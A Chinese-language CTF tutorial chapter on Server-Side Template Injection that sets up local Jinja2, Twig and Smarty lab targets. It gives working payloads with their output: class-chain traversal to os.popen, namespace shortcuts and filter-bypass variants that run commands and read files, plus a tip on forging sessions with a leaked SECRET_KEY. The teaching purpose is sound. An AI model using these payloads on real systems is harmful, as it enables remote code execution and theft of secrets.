---
chapter: Web安全
section: SSTI
order: 609
tags:
  - CTF
  - Web安全
  - SSTI
  - 模板注入
publish: true
---

# W09 SSTI
## Server-Side Template Injection

> [!info]- 章节信息
> **所属方向**：Web 安全 ｜ **难度阶段**：L2 核心漏洞期 ｜ **前置要求**：[[11-Web安全版图与Burp|11 章]] · [[W02-工具链实战与靶场搭建|W02]] · [[W05-命令注入与代码执行|W05]]
> **本章目标**：分清"输入进模板源码"与"输入进模板变量"的边界；在自建 Flask/Jinja2 靶上走完探测、引擎识别、类链构造、命名空间入口到读 flag 与执行命令的完整利用阶梯；掌握下划线、点、方括号、引号四类过滤的绕过写法；理解 SandboxedEnvironment 拦什么、为什么拦得住；了解 Twig 与 Smarty 两个 PHP 引擎的识别与利用现状；最后从防御视角给出模板与数据分离、沙箱、最小拼接面三层修法。

[[11-Web安全版图与Burp#3.9 SSTI：模板引擎把输入当语法编译了|11 章 3.9]] 已经用 jinja2 原生接口搭过最小靶，并完成了 `{{7*7}}` 探测、`{{7*'7'}}` 分引擎和 lipsum 一条读 flag 的 payload。那一节回答的是"这类漏洞存在"；本章回答"这类漏洞怎么系统地打"。与 [[W05-命令注入与代码执行|W05]] 的分工也照旧：W05 讲清了"本该当数据的输入被当成了代码"，SSTI 是它的第三个变体——输入进的不是 shell 字符串、不是 eval，而是**模板源码**，第 1 节只划边界不重讲。

[[W02-工具链实战与靶场搭建|W02]] 的靶场方法继续沿用：自建靶、curl 手工打、每条 payload 配输出。端口用 8900 段。

> [!note] 本章的实验约定
> 三个靶都监听 `127.0.0.1`：漏洞靶 8901、过滤靶组 8902、沙箱靶 8903。引擎版本：jinja2 3.1（Flask 3.1）、Twig 3.23、Smarty 4.5——SSTI 的 payload 对版本敏感，第 6、7 节会看到版本差异如何改写利用路线。curl 一律写成下面的形式：
>
> ```bash
> curl -sG --noproxy '*' --data-urlencode 'name=payload' 'http://127.0.0.1:8901/'
> ```
>
> `-G` 把 `--data-urlencode` 的内容编码成查询串，payload 里的空格、引号、花括号不用手工转义；`--noproxy '*'` 防止系统代理往响应里塞内容（[[11-Web安全版图与Burp#6. 常见问题|11 章常见问题表]]讲过这个坑）；URL 一律单引号包住，防止本地 shell 抢先解释特殊字符。

## 1. 注入边界：进模板源码，还是进变量

模板引擎干的事：拿一份**模板**（文本加占位语法）和一组**数据**，渲染出最终文本。HTML 页面渲染是它最常见的用途，渲染发生在服务器端。以 Flask/Jinja2 为例，同一个"打招呼"功能有两种写法：

```python
from flask import render_template_string

# 正确：模板是常量，用户输入作为变量传入
render_template_string("Hello {{ name }}!", name=name)

# 漏洞：拼接之后，用户输入成了模板源码的一部分
render_template_string("Hello " + name + "!")
```

差别在字符串拼接发生的那一刻：`"Hello " + name + "!"` 先拼成一个新字符串，再把它整体交给模板引擎当**模板源码**编译。输入里若出现 `{{ }}`、`{% %}`，引擎不会把它们当文本——它们是语法，会被求值。[[11-Web安全版图与Burp#3.9 SSTI：模板引擎把输入当语法编译了|11 章 3.9]] 的 `Template("Hello " + name + "!").render()` 是同一件事的裸接口形态。

==SSTI 的判定锚点：输入最终落进了渲染函数的第一个参数（模板串）里==。与 [[W05-命令注入与代码执行|W05]] 第 1 节的两条注入放在一起看：

| | 命令注入 | 代码执行 | SSTI |
| ---- | ---- | ---- | ---- |
| 输入进什么 | shell 命令字符串 | 宿主语言源代码 | 模板源码 |
| 谁来解释 | `/bin/sh` | PHP/Python 解释器 | 模板引擎的编译器 |
| 能力边界 | shell 能做的一切 | 宿主语言能做的一切 | 模板语法能触及的一切 |
| 典型题面 | "在线 ping" | "在线计算器" | 渲染回显类页面 |

模板语法能触及多少，取决于引擎：jinja2 的模板里可以写完整的 Python 表达式、访问对象属性、调用方法——从模板语法一路走到 Python 对象模型，就能摸到标准库。这正是第 4 节"利用阶梯"的全部内容。 Twig、Smarty 各有各的触及面，第 7 节单独看。

与 XSS 的区别一句话：XSS 的输入被当成 HTML，由**浏览器**解释（[[W08-XSS|W08]]）；SSTI 的输入在**服务器端**就被编译执行。两者可以共存——SSTI 渲染出的内容同样会送到浏览器。

> [!note] 模板语法本身不是漏洞
> `{{ }}` 是模板引擎的正常功能。漏洞出在"数据升格为模板源码"的那一次拼接——出题人的代码里几乎总能找到一句 `render_template_string("..." + input)` 或等价写法。防御侧的全部努力（第 8 节）就是取消这次拼接。

## 2. Flask/Jinja2 靶

装 Flask：`apt-get install -y python3-flask`（或 `pip3 install flask`，自带 jinja2）。靶场一个目录两个文件：

```
web_ssti/
├── app.py
└── flag.txt          ← 内容 flag{s5t1_p0p3n_r34d}
```

```python
# app.py —— Flask SSTI 漏洞靶：name 参数原样拼进模板字符串
from flask import Flask, request, render_template_string

app = Flask(__name__)


@app.get("/")
def hello():
    name = request.args.get("name", "guest")
    return render_template_string("<h2>Hello " + name + "!</h2>")


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8901)
```

与 11 章 3.9 那个 jinja2 原生接口靶是同一个洞、两种皮：`Template(串).render()` 是库的最小用法，`render_template_string(串)` 是 Flask 的常用入口——CTF 题里后者更常见，且框架会往模板上下文里多塞几个对象（第 4.4 节会用到）。启动靶：

```bash
cd web_ssti
python3 app.py
```

正常访问：

```bash
curl -sG --noproxy '*' --data-urlencode 'name=CTF' 'http://127.0.0.1:8901/'
```

输出：

```
<h2>Hello CTF!</h2>
```

输入被渲染进页面、原样回显——典型的注入候选位。注入点成立与否，下一节的探测一发就能确认。

## 3. 引擎识别

识别分三步，顺序固定：==先确认模板语法活了，再分引擎家族，再补专有指纹==。第一步没过（`{{7*7}}` 原样出现）说明输入根本没进模板源码，后面全免谈。

**第一步：确认模板语法。** 探测表达式用数学运算，输出好认、副作用为零：

```bash
curl -sG --noproxy '*' --data-urlencode 'name={{7*7}}' 'http://127.0.0.1:8901/'
```

输出：

```
<h2>Hello 49!</h2>
```

页面出现 49 而不是字面量 `{{7*7}}`，模板注入成立。

**第二步：分引擎。** 同一个探测式，不同引擎给出不同结果：

```bash
curl -sG --noproxy '*' --data-urlencode "name={{7*'7'}}" 'http://127.0.0.1:8901/'
curl -sG --noproxy '*' --data-urlencode 'name=${7*7}' 'http://127.0.0.1:8901/'
```

输出：

```
<h2>Hello 7777777!</h2>
```

```
<h2>Hello ${7*7}!</h2>
```

`{{7*'7'}}` 返回 `7777777`：jinja2 把 `'7'` 当字符串，乘七次得七个 7；`${7*7}` 原样出现：jinja2 不认 `${ }` 语法。换成 Twig 再打一遍。Twig 是 PHP 库，用一小段 PHP 模拟"拼接后渲染"。Twig 与 Smarty 的探测脚本每次运行都先打一行版本号，下文输出块不再重复贴出：

```php
<?php
// twig_t.php —— Twig 探测：payload 从 argv[1] 拼进模板串（模拟 SSTI）
require '/usr/share/php/Twig/autoload.php';

$payload = $argv[1] ?? '';
$env = new Twig\Environment(new Twig\Loader\ArrayLoader(['base' => 'x']));
try {
    echo $env->createTemplate('Hello ' . $payload . '!')->render() . "\n";
} catch (Throwable $e) {
    echo '[error] ' . get_class($e) . ': ' . $e->getMessage() . "\n";
}
```

```bash
php twig_t.php '{{7*7}}'
php twig_t.php "{{7*'7'}}"
php twig_t.php '${7*7}'
```

输出：

```
Twig version: 3.23.0
Hello 49!
```

```
Hello 49!
```

```
Hello ${7*7}!
```

Twig 也算 `{{7*7}}`，但 `{{7*'7'}}` 给 **49**——Twig 把 `'7'` 转成数字再做乘法。同一个探测式，`7777777` 是 jinja2、`49` 是 Twig，这一对就是最常用的分家探针。Smarty 再看一组，探测脚本同构：

```php
<?php
// smarty_t.php —— Smarty 探测：payload 从 argv[1] 拼进模板串（模拟 SSTI）
require '/usr/share/php/smarty4/bootstrap.php';

$payload = $argv[1] ?? '';
$smarty = new Smarty();
$smarty->setCompileDir('/tmp/w09_smarty_c');
try {
    $smarty->display('eval:' . $payload);
    echo "\n";
} catch (Throwable $e) {
    echo '[error] ' . get_class($e) . ': ' . $e->getMessage() . "\n";
}
```

```bash
php smarty_t.php '{$smarty.version}'
php smarty_t.php '{7*7}'
php smarty_t.php '${7*7}'
```

输出：

```
Smarty version: 4.5.5
4.5.5
```

```
49
```

```
$49
```

Smarty 的定界符是单花括号：`{{7*7}}` 它根本不解析（原样输出），`{7*7}` 才求值得 49；`${7*7}` 输出 `$49`——`$` 是普通字符，`{7*7}` 部分被求值。`{$smarty.version}` 直接报版本号，识别一步到位。

**第三步：汇总成决策树。** 按命中结果查下表：

| 已知事实 | 结论 |
| ---- | ---- |
| `{{7*7}}` 原样出现 | 输入没进模板源码，不是 SSTI（或注入点在别处） |
| `{{7*7}}` → 49，`{{7*'7'}}` → 7777777 | jinja2 |
| `{{7*7}}` → 49，`{{7*'7'}}` → 49 | Twig |
| `{{7*7}}` 原样，`{7*7}` → 49 或 `${7*7}` → `$49` | Smarty |
| `{{7*7}}` 原样，`${7*7}` → 49 | Mako / FreeMarker 一族（`${ }` 系） |

第一张表覆盖不到的引擎，用各自的专有语法续判。这些探测值出自公开 payload 表，本章没有逐一配靶，命中后按引擎再查利用语法：

| 引擎 | 探测输入 | 命中特征 |
| ---- | ---- | ---- |
| Mako | `${7*7}` | 输出 49 |
| FreeMarker | `${7*7}` | 输出 49 |
| ERB（Ruby） | `<%= 7*7 %>` | 输出 49 |
| Tornado | `{{7*7}}` | 输出 49（与 jinja2 同形，需专有语法续分） |
| Velocity | `#set($x=7*7)$x` | 输出 49 |

> [!warning] 识别必须先于利用
> payload 是按引擎写的：拿 jinja2 的类链去打 Twig 靶只会收获一屏报错，反过来也一样。第 4 节开始的所有 jinja2 payload 都以"第 3 节识别出 jinja2"为前提。真实题里还有更省事的线索：响应头 `Server`、报错页里的框架字样、`{{7*7}}` 触发的异常栈——能直接报引擎的，跳过试探。

## 4. Jinja2 利用阶梯

识别出 jinja2 之后，利用是一条固定的攀登路线：==任意值 → 类 → object → 子类清单 → 标准库 → 命令执行==。每一级都只用到上一级的结果，逐级展开就能读懂任何变体。

### 4.1 从任意值走到 object

jinja2 模板里可以访问对象属性。Python 里任何对象都带 `__class__`（它的类），类又带 `__mro__`（方法解析顺序，从自己一路列到 object）和 `__base__`（直接基类）。用空字符串当起点：

```bash
curl -sG --noproxy '*' --data-urlencode "name={{ ''.__class__ }}" 'http://127.0.0.1:8901/'
curl -sG --noproxy '*' --data-urlencode "name={{ ''.__class__.__mro__ }}" 'http://127.0.0.1:8901/'
curl -sG --noproxy '*' --data-urlencode "name={{ ''.__class__.__base__ }}" 'http://127.0.0.1:8901/'
```

输出：

```
<h2>Hello &lt;class &#39;str&#39;&gt;!</h2>
```

```
<h2>Hello (&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)!</h2>
```

```
<h2>Hello &lt;class &#39;object&#39;&gt;!</h2>
```

三条分别给出 `<class 'str'>`、元组 `(<class 'str'>, <class 'object'>)`、`<class 'object'>`——路线的终点都是 object。输出里的 `&lt;` `&#39;` 是 Flask 的自动转义在起作用：`render_template_string` 渲染时默认开启 HTML 转义，求值结果里的 `<`、`'` 以实体形式**显示**；==转义只影响显示，不影响求值==，flag 这类不含特殊字符的输出照常完整读出（4.3 节可见）。

### 4.2 __subclasses__：枚举子类找标准库

object 是所有类的根。`object.__subclasses__()` 列出解释器当前**已加载**的全部子类——==Flask 应用进程里，标准库的类也在其中==：

```bash
curl -sG --noproxy '*' --data-urlencode "name={{ ''.__class__.__base__.__subclasses__()|length }}" 'http://127.0.0.1:8901/'
```

输出：

```
<h2>Hello 539!</h2>
```

五百多个类，要从中找到能执行命令的那个。经典目标是 `os._wrap_close`——`os.popen` 内部用的包装类，它的 `__init__.__globals__` 就是 os 模块的命名空间，里面有 `popen` 函数。列表那么长，下标怎么拿？jinja2 的语句块 `{% %}` 同样可以注入，写个探针让引擎自己数：

```bash
curl -sG --noproxy '*' --data-urlencode "name={% for c in ''.__class__.__base__.__subclasses__() %}{% if c.__name__ == '_wrap_close' %}{{ loop.index0 }}{% endif %}{% endfor %}" 'http://127.0.0.1:8901/'
```

输出：

```
<h2>Hello 167!</h2>
```

`loop.index0` 是 jinja2 for 循环自带的下标变量，从 0 起数。本靶里 `os._wrap_close` 排在第 167 位。

> [!warning] 下标不是常数，别背别人的数字
> `__subclasses__()` 的清单随进程加载过的模块变化：应用多 import 一个库、多注册一个蓝图，清单就变长变短，同一个类的下标跟着变。换一个靶子，167 大概率不对。==正确姿势是每次都用 `{% for %}` 探针现数==，把"定位"做成利用流程的固定一步。 类名判断也可以换目标：`subprocess.Popen`、`warnings.catch_warnings` 是常用的备选，原理相同（它们的 `__init__.__globals__` 分别落在 subprocess、warnings 模块，再经 `__builtins__` 或已导入的模块接着走）。

> [!info]- os._wrap_close 是什么
> `os.popen('命令')` 返回一个包装了管道的文件对象，实现这个行为的内部类就是 `os._wrap_close`。os 模块被 import 时这个类就完成定义，所以任何 Python 进程里它都在 object 的子类清单上。`某个类.__init__.__globals__` 拿到的是**定义该方法的模块**的全局命名空间——对 `_wrap_close.__init__` 来说就是 os 模块自己的命名空间字典，`['popen']` 直接取到 `os.popen`。这正是"随便找个标准库类，顺着 `__globals__` 就能摸回它的模块"这一通法的具体案例。

### 4.3 走到命令执行

把 4.1、4.2 的各级串起来：

```bash
curl -sG --noproxy '*' --data-urlencode "name={{ ''.__class__.__base__.__subclasses__()[167].__init__.__globals__['popen']('cat flag.txt').read() }}" 'http://127.0.0.1:8901/'
```

输出：

```
<h2>Hello flag{s5t1_p0p3n_r34d}
!</h2>
```

flag 出现在 `Hello` 和 `!` 之间（`cat` 的输出自带换行，换行落在了 `!` 前面）。逐段读这条链：

| 片段 | 含义 |
| ---- | ---- |
| `''.__class__` | 空字符串的类，str |
| `.__base__` | str 的基类，object（`__mro__[1]` 等价） |
| `.__subclasses__()` | object 的全部已加载子类 |
| `[167]` | 取到 os._wrap_close |
| `.__init__.__globals__` | os 模块的命名空间字典 |
| `['popen']` | os.popen 函数 |
| `('cat flag.txt').read()` | 执行命令、读回全部输出 |

把命令换成 `id`，执行能力看得更直白：

```bash
curl -sG --noproxy '*' --data-urlencode "name={{ ''.__class__.__base__.__subclasses__()[167].__init__.__globals__['popen']('id').read() }}" 'http://127.0.0.1:8901/'
```

输出：

```
<h2>Hello uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
!</h2>
```

==能执行命令，就能读 flag、列目录、反弹 shell==——终点能力与命令注入完全相同，差别只在入口（[[W05-命令注入与代码执行|W05]] 第 1 节的边界表）。反弹 shell 的写法直接复用 W05 的元字符知识，不再重复。

### 4.4 命名空间入口：config、lipsum、url_for、self

类链从"任意值"起步，通用但每级都要写。模板上下文里现成躺着几个特殊名字，==它们本身就挂在框架模块附近，一段就能跳到标准库==：

| 名字 | 来源 | 是什么 |
| ---- | ---- | ---- |
| `config` | Flask 注入 | 应用的配置对象 |
| `lipsum` | jinja2 默认命名空间 | 生成乱数假文的函数 |
| `url_for` | Flask 注入 | 反查 URL 的函数 |
| `self` | jinja2 默认命名空间 | 当前模板的引用对象 |

`{{ config }}` 先看一眼它是什么：

```bash
curl -sG --noproxy '*' --data-urlencode 'name={{ config }}' 'http://127.0.0.1:8901/'
```

输出（节选，原文为一整个配置字典）：

```
<h2>Hello &lt;Config {&#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;SECRET_KEY&#39;: None, …&#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, …}&gt;!</h2>
```

配置对象本身就是一条信息泄露：本靶没设密钥所以 `SECRET_KEY` 是 None，真实站点这里回显的是真实密钥，==拿到 SECRET_KEY 就能伪造 Flask 的 session cookie==，是 SSTI 之外的第二段利用素材。config 的类挂在 Flask 模块上，顺着类链同样能到 os：

```bash
curl -sG --noproxy '*' --data-urlencode "name={{ config.__class__.__init__.__globals__['os'].popen('id').read() }}" 'http://127.0.0.1:8901/'
```

输出：

```
<h2>Hello uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
!</h2>
```

11 章用过的 lipsum 是最短的一条：函数对象的 `__globals__` 指向定义它的模块（jinja2.utils）的命名空间，里面恰好 import 过 os：

```bash
curl -sG --noproxy '*' --data-urlencode "name={{ lipsum.__globals__['os'].popen('cat flag.txt').read() }}" 'http://127.0.0.1:8901/'
```

输出：

```
<h2>Hello flag{s5t1_p0p3n_r34d}
!</h2>
```

`url_for` 与 `self` 走 `__builtins__` 路：任何模块的命名空间里都有 `__builtins__`，从它取 `__import__` 就能导入任意模块，不再依赖"恰好 import 过 os"：

```bash
curl -sG --noproxy '*' --data-urlencode "name={{ url_for.__globals__['__builtins__']['__import__']('os').popen('id').read() }}" 'http://127.0.0.1:8901/'
curl -sG --noproxy '*' --data-urlencode 'name={{ self }}' 'http://127.0.0.1:8901/'
curl -sG --noproxy '*' --data-urlencode "name={{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}" 'http://127.0.0.1:8901/'
```

输出：

```
<h2>Hello uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
!</h2>
```

```
<h2>Hello &lt;TemplateReference None&gt;!</h2>
```

```
<h2>Hello uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
!</h2>
```

`{{ self }}` 渲染出 `TemplateReference None`——它是 jinja2 运行时给每个模板配的引用对象，`__init__.__globals__` 落在 jinja2.runtime 模块，后面的路与 url_for 相同。四条入口加上 4.3 的类链，构成一张从"模板里现成的名字"到"命令执行"的地图：==入口选短的，链路选活的==——出题人滤了哪个名字、断了哪一环，就换一条。

> [!note] 两类终点
> SSTI 利用走到头就是两件事：**执行命令**（`popen('cat /flag').read()`、反弹 shell）与**读对象**（`{{ config }}` 拿密钥、遍历 `__subclasses__()` 摸环境）。回显友好时前者一步到位；无回显时的延时判定与外带通道与命令注入完全同构，[[W05-命令注入与代码执行#6. 无回显 RCE|W05 第 6 节]]的方法原样搬用，把 payload 换成本章任意一条执行链即可。

## 5. 过滤绕过

真实题目会在拼接前过滤输入。过滤靶组一个文件四个路由，各禁一类字符，命中直接拒绝：

```python
# filter_app.py —— 过滤靶组：f1 禁下划线，f2 禁点，f3 禁方括号，f4 禁引号
from flask import Flask, request, render_template_string

app = Flask(__name__)

FILTERS = {
    "f1": ("_", "underscore"),
    "f2": (".", "dot"),
    "f3": ("[]", "bracket"),
    "f4": ("'\"", "quote"),
}


@app.get("/<route>")
def hello(route):
    if route not in FILTERS:
        return "no such route\n", 404
    name = request.args.get("name", "guest")
    for ch in FILTERS[route][0]:
        if ch in name:
            return "blocked: " + FILTERS[route][1] + "\n", 400
    return render_template_string("<h2>Hello " + name + "!</h2>")


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8902)
```

```bash
cd web_ssti
python3 filter_app.py
```

先看被拦的形态，确认过滤在工作：

```bash
curl -sG --noproxy '*' -w '[%{http_code}]\n' --data-urlencode "name={{ ''.__class__ }}" 'http://127.0.0.1:8902/f1'
```

输出：

```
blocked: underscore
[400]
```

### 5.1 下划线被滤：attr 过滤器与 request 变量

类链 payload 的下划线全在 `__class__`、`__globals__` 这些属性名里。绕过思路：==被滤的是模板文本里的字符，那就别在模板里写它们==。jinja2 的 `attr` 过滤器做点访问的事，且属性名可以是任意表达式——把属性名从 URL 参数读进来：

```bash
curl -sG --noproxy '*' --data-urlencode "name={{ ()|attr(request.args.a) }}" --data-urlencode 'a=__class__' 'http://127.0.0.1:8902/f1'
```

输出：

```
<h2>Hello &lt;class &#39;tuple&#39;&gt;!</h2>
```

`()` 是空元组，`attr(request.args.a)` 取到它的类——`__class__` 三个下划线字符一个都没出现在模板里，它们躺在查询参数 `a` 里。起跳点用 `()` 或 `lipsum` 都行，完整链如下（属性名 `g`、`i`、`m` 由参数提供，不含下划线的 `popen`、`read` 留在模板里）：

```bash
curl -sG --noproxy '*' \
  --data-urlencode "name={{ lipsum|attr(request.args.g)|attr(request.args.i)(request.args.m)|attr('popen')('id -un')|attr('read')() }}" \
  --data-urlencode 'g=__globals__' --data-urlencode 'i=__getitem__' --data-urlencode 'm=os' \
  'http://127.0.0.1:8902/f1'
```

输出：

```
<h2>Hello hua
!</h2>
```

链路读法：`lipsum` 经 `attr(g)` 取 `__globals__`，得到一个字典；`attr(i)` 取字典的 `__getitem__` 方法；`(request.args.m)` 调用它、取出 `os` 模块；后三段照旧 `popen`、`read`。

> [!note] request 是框架给的名字
> `request` 是 Flask 注入模板上下文的对象，`request.args` 是查询参数表。这个技巧依赖框架上下文——裸 jinja2（11 章 3.9 那种 `Template().render()` 靶）的上下文里没有 request，注入点在别的框架（Django、Tornado）时要换该框架的上下文对象。

### 5.2 点被滤：attr 链

点访问 `x.y` 全部换成 `x|attr('y')` 写法，payload 里就不再出现点：

```bash
curl -sG --noproxy '*' --data-urlencode "name={{ ()|attr('__class__') }}" 'http://127.0.0.1:8902/f2'
curl -sG --noproxy '*' --data-urlencode "name={{ lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id -un')|attr('read')() }}" 'http://127.0.0.1:8902/f2'
```

输出：

```
<h2>Hello &lt;class &#39;tuple&#39;&gt;!</h2>
```

```
<h2>Hello hua
!</h2>
```

5.1 的 request 技巧本身带着点（`request.args.g`），在点过滤下要连 request 也走 attr：

```bash
curl -sG --noproxy '*' \
  --data-urlencode "name={{ lipsum|attr(request|attr('args')|attr('get')('g'))|attr('__getitem__')('os')|attr('popen')('id -un')|attr('read')() }}" \
  --data-urlencode 'g=__globals__' \
  'http://127.0.0.1:8902/f2'
```

输出：

```
<h2>Hello hua
!</h2>
```

`request|attr('args')` 取参数表，`|attr('get')('g')` 调参数表的 get 方法取 `g` 的值——整条 payload 无点、无下划线、无方括号。

### 5.3 方括号被滤：__getitem__ 与 pop

下标访问 `[N]` 是对象自己的方法调用：`列表[167]` 等价于 `列表.__getitem__(167)`。先把定位探针也改成无方括号写法，现数一遍下标：

```bash
curl -sG --noproxy '*' --data-urlencode "name={% for c in ''.__class__.__mro__.__getitem__(1).__subclasses__() %}{% if c.__name__ == '_wrap_close' %}{{ loop.index0 }}{% endif %}{% endfor %}" 'http://127.0.0.1:8902/f3'
```

输出：

```
<h2>Hello 167!</h2>
```

全链用 `__getitem__` 替换每一处方括号，字典取键 `'popen'` 同理：

```bash
curl -sG --noproxy '*' --data-urlencode "name={{ ''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(167).__init__.__globals__.__getitem__('popen')('cat flag.txt').read() }}" 'http://127.0.0.1:8902/f3'
```

输出：

```
<h2>Hello flag{s5t1_p0p3n_r34d}
!</h2>
```

列表和字典都自带 `pop` 方法，也能当下标用：

```bash
curl -sG --noproxy '*' --data-urlencode "name={{ ''.__class__.__mro__.__getitem__(1).__subclasses__().pop(167).__init__.__globals__.pop('popen')('id -un').read() }}" 'http://127.0.0.1:8902/f3'
```

输出：

```
<h2>Hello hua
!</h2>
```

> [!warning] pop 是破坏性的
> `pop` 是"取出并删除"：第一次命中后，`popen` 这个键就从 os 模块命名空间里消失了，`_wrap_close` 也从子类清单里消失了。同一进程内再打同类 payload，直接 500：
>
> ```bash
> curl -sG --noproxy '*' -w '[%{http_code}]\n' --data-urlencode "name={{ ''.__class__.__mro__.__getitem__(1).__subclasses__().pop(167).__init__.__globals__.pop('popen')('id -un').read() }}" 'http://127.0.0.1:8902/f3'
> ```
>
> 输出：
>
> ```
> <!doctype html>
> <html lang=en>
> <title>500 Internal Server Error</title>
> <h1>Internal Server Error</h1>
> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
> [500]
> ```
>
> 打靶调 payload 时每 500 一次就重启一次靶，否则后面的失败都是自己破坏的现场。另一个细节：`__mro__` 是元组，元组没有 pop，pop 只能用在子类清单和字典上。

### 5.4 引号被滤：字符串全部走参数

payload 里的字符串（`'os'`、`'popen'`、命令文本）若不允许写引号，把它们全部挪进查询参数，模板里只留变量引用：

```bash
curl -sG --noproxy '*' \
  --data-urlencode "name={{ lipsum|attr(request.args.g)|attr(request.args.i)(request.args.m)|attr(request.args.p)(request.args.c)|attr(request.args.r)() }}" \
  --data-urlencode 'g=__globals__' --data-urlencode 'i=__getitem__' --data-urlencode 'm=os' \
  --data-urlencode 'p=popen' --data-urlencode 'c=cat flag.txt' --data-urlencode 'r=read' \
  'http://127.0.0.1:8902/f4'
```

输出：

```
<h2>Hello flag{s5t1_p0p3n_r34d}
!</h2>
```

这条 payload 里没有下划线、没有方括号、没有引号——只有点和竖线。拿它回头打三个靶看适用面：

```bash
P='name={{ lipsum|attr(request.args.g)|attr(request.args.i)(request.args.m)|attr(request.args.p)(request.args.c)|attr(request.args.r)() }}'
for rt in f1 f2 f3; do
  curl -sG --noproxy '*' --data-urlencode "$P" \
    --data-urlencode 'g=__globals__' --data-urlencode 'i=__getitem__' --data-urlencode 'm=os' \
    --data-urlencode 'p=popen' --data-urlencode 'c=cat flag.txt' --data-urlencode 'r=read' \
    "http://127.0.0.1:8902/$rt"
  echo
done
```

输出：

```
<h2>Hello flag{s5t1_p0p3n_r34d}
!</h2>
```

```
blocked: dot
```

```
<h2>Hello flag{s5t1_p0p3n_r34d}
!</h2>
```

f1、f3、f4 全过，f2 被拦——==这条 payload 自带的点在 `request.args.g` 里==。点的解法就是 5.2 的变体：request 自己也走 attr 链。四类过滤各有解法，汇总如下：

| 被滤字符 | 绕法 | 关键前提 |
| ---- | ---- | ---- |
| `_` | attr 过滤器接 request.args 传属性名 | 上下文有 request（或可用其他对象传字符串） |
| `.` | 每一步点访问换成 attr 过滤器写法 | 无 |
| `[` `]` | `__getitem__` 方法取下标取键；pop 可用但破坏现场 | 对象支持该方法 |
| 引号 | 字符串全部改由 request.args 等参数提供 | 同第一行 |
| 多类叠加 | request 也走 attr 链（5.2 变体）；更重的叠加需字符串拼装技巧 | 见下方说明 |

> [!info]- 过滤叠加到极限之后
> 四类字符同时被禁时，连 `request|attr('args')` 里的引号都写不出来，需要凭空构造字符串：常见路数是用 `{% set %}` 存中间值、用字符串的 `join` 或 `chr` 类调用逐字符拼出属性名，再喂给 attr。拼装式 payload 长、可读性差、对版本敏感，本书不展开模板；需要时按"构造字符串 → attr 取属性"两步框架去 PayloadsAllTheThings 的 SSTI 篇查现成写法。出题人把过滤叠满的情况不多，多数题禁一两类字符，本章四节已经够用。

## 6. 沙箱逃逸入门

jinja2 自带一个沙箱环境 `jinja2.sandbox.SandboxedEnvironment`：给"模板内容不完全可信"的场景用——比如应用允许用户自定义邮件模板、报表模板。第三个靶把它换进渲染入口：

```python
# sandbox_app.py —— 沙箱靶：SandboxedEnvironment 渲染同一批 payload
from flask import Flask, request
from jinja2.sandbox import SandboxedEnvironment

app = Flask(__name__)
env = SandboxedEnvironment()


@app.get("/")
def hello():
    name = request.args.get("name", "guest")
    try:
        out = env.from_string("<h2>Hello " + name + "!</h2>").render()
        return out
    except Exception as e:
        return "[error] %s: %s\n" % (type(e).__name__, e)


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8903)
```

```bash
cd web_ssti
python3 sandbox_app.py
```

普通表达式不受影响，正常代码照常运行：

```bash
curl -sG --noproxy '*' --data-urlencode 'name={{ 7*7 }}' 'http://127.0.0.1:8903/'
curl -sG --noproxy '*' --data-urlencode "name={{ 'abc'.upper() }}" 'http://127.0.0.1:8903/'
```

输出：

```
<h2>Hello 49!</h2>
```

```
<h2>Hello ABC!</h2>
```

沙箱拦的是属性访问。打第 4 节的链：

```bash
curl -sG --noproxy '*' --data-urlencode "name={{ ''.__class__ }}" 'http://127.0.0.1:8903/'
curl -sG --noproxy '*' --data-urlencode "name={{ ''.__class__.__base__ }}" 'http://127.0.0.1:8903/'
curl -sG --noproxy '*' --data-urlencode "name={{ ''|attr('__class__') }}" 'http://127.0.0.1:8903/'
curl -sG --noproxy '*' --data-urlencode "name={{ lipsum.__globals__['os'].popen('id').read() }}" 'http://127.0.0.1:8903/'
curl -sG --noproxy '*' --data-urlencode "name={{ '{0.__class__}'.format('') }}" 'http://127.0.0.1:8903/'
```

输出：

```
<h2>Hello !</h2>
```

```
[error] SecurityError: access to attribute '__class__' of 'str' object is unsafe.
```

```
<h2>Hello !</h2>
```

```
[error] SecurityError: access to attribute '__globals__' of 'function' object is unsafe.
```

```
<h2>Hello !</h2>
```

五种结果合起来就是沙箱的拦截面：

- **点访问双下划线属性**（第一条）：没有报错，渲染成空串——被拦截的访问返回一个特殊 Undefined，直接打印它就是空字符串；
- **在被拦截的值上继续链**（第二条）：`.__base__` 要先解开那个 Undefined，这一步触发 `SecurityError`，报错写明哪个属性不安全；
- **attr 过滤器**（第三条）：与点访问同一套检查，同样变空串；
- **`__globals__`**（第四条）：函数对象的内部属性，同样在黑名单里；
- **str.format 格式化**（第五条）：`'{0.__class__}'.format('')` 想借格式化语法访问属性——沙箱对 `format` 和 `format_map` 有专门的包装检查，同样只剩空串。

机制一句话：==SandboxedEnvironment 把"下划线开头的属性"与各对象的内部属性判为不安全，访问结果替换成触发 SecurityError 的占位值==。第 4 节的整条利用链，从 `__class__` 第一步就被掐断。

> [!info]- 沙箱的版本史与公开逃逸思路
